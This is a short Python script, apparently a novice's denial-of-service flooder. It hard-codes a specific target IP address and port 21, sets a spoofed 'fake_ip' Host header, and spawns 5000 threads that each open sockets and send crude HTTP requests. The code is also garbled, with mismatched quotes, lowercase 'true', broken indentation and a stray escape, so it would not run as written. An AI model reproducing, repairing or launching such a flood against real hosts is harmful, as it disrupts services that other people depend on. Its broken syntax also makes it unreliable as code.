import socket
import threading 

target='37.59.174.225'
fake_ip= '123.12.23.4'
port= 21 
while true:
	def attack ():
       #While True:
	       s =   socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,port))
s.sendto(("GET /"+target+ "HTTP/1.1\\"). encode ('ascii"), (target, port))
s.sendto(("Host: "+ fake_ip+ \\\\).encode('ascii'),  (target, port))
s.close()




#fora da função attack agora vamos chamar a função num loop


for i in range(5000):
     thread = threading.Thread(target=attack)
thread.start()
